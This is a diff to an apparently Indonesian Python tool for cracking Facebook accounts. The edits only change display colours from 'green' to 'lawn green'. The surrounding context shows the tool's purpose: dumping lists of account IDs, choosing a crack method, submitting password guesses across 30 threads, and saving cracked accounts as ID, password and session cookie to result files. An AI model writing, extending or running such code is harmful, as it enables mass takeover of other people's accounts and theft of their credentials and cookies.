@@ -441,13 +441,13 @@ def dump_massal():
 	if len(id)==0:
 		tot2 = mark(tot, style='red')
 	else:
-		tot2 = mark(tot, style='green')
+		tot2 = mark(tot, style='lawn green')
 	sol().print(tot2)
 	setting()
 
 def setting():
 	wl = '# SETTING URUTAN ID'
-	sol().print(mark(wl, style='green'))
+	sol().print(mark(wl, style='lawn green'))
 	teks = '[01] Crack Dari Akun Tertua \n[02] Crack Dari Akun Termuda \n[03] Acak Urutan ID'
 	tak = nel(teks, style='cyan')
 	cetak(nel(tak, title='SETTING'))
@@ -467,7 +467,7 @@ def setting():
 		sol().print(mark(ric, style='red'))
 		exit()
 	met = '# PILIH METHOD CRACK'
-	sol().print(mark(met, style='green'))
+	sol().print(mark(met, style='lawn green'))
 	ioz = '[01] Method B-Api (Cepat)\n[02] Method Mobile (Hasil OK)\n[03] Methode Free Facebook (Lambat)'
 	gess = nel(ioz, style='cyan')
 	cetak(nel(gess, title='METHOD'))
@@ -479,7 +479,7 @@ def setting():
 	else:
 		method.append('mobile')
 	guw = '# PILIHAN OPSI CRACK '
-	sol().print(mark(guw, style='green'))
+	sol().print(mark(guw, style='lawn green'))
 	aplik = input(x+'['+p+'f'+x+'] Tampilkan Appl terkait? [ Not Recommended ] (y/t) : ')
 	if aplik in ['y','Y']:
 		taplikasi.append('ya')
@@ -494,7 +494,7 @@ def setting():
 
 def passwrd():
 	ler = '# CRACK PROCESS BEGINS, PRESS CTRL+Z TO STOP'
-	sol().print(mark(ler, style='green'))
+	sol().print(mark(ler, style='lawn green'))
 	krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit, jika masih tidak ada hasil, silahkan banting hp mu lalu beli hp baru ya'%(okc,cpc)
 	cetak(nel(krek, title='CRACK'))
 	with tred(max_workers=30) as pool:
@@ -527,7 +527,7 @@ def passwrd():
 				pool.submit(crack,idf,pwv)
 	print('')
 	tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
-	sol().print(mark(tanya, style='green'))
+	sol().print(mark(tanya, style='lawn green'))
 	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
 	if woi in ['y','Y']:
 		cek_opsi()
@@ -573,7 +573,7 @@ def crack(idf,pwv):
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[OK] {idf} | {pw}'
-					statusok1 = nel(statusok, style='green')
+					statusok1 = nel(statusok, style='lawn green')
 					cetak(nel(statusok1, title=' LIVE'))
 					break
 				elif 'ya' in taplikasi:
@@ -638,7 +638,7 @@ def crack(idf,pwv):
 					else:pass
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'
-					statusok1 = nel(statusok, style='green')
+					statusok1 = nel(statusok, style='lawn green')
 					cetak(nel(statusok1, title='OK'))
 					break
 
@@ -741,7 +741,7 @@ def crack3(idf,pwv):
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, style='green')
+					statusok1 = nel(statusok, style='lawn green')
 					cetak(nel(statusok1, title='OK'))
 					break
 				elif 'ya'in taplikasi:
